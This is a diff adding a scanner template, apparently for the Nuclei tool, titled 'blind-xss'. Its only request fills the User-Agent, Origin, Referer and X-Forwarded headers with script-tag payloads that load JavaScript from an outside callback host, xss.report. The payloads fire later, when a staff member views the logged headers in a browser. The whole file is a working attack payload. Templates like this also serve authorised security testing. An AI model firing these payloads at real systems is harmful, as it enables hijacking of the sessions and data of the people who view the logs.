@@ -1,0 +1,18 @@
+id: blind-xss-3
+
+info:
+  name: blind-xss
+  author: 4rt3f4kt
+  severity: high
+  tags: blind-xss,generic,fuzzing-req
+  
+http:
+  - raw:
+      - |
+        GET {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: "></script></script><script src="https://xss.report/c/atf"></script>
+        Origin: "></script></script><script src="https://xss.report/c/atf"></script>
+        Referer: "></script><script src="https://xss.report/c/atf"></script>
+        X-Forwarded-Host: "></script></script><script src="https://xss.report/c/atf"></script>
+        X-Forwarded-For: "></script><script src="https://xss.report/c/atf"></script>
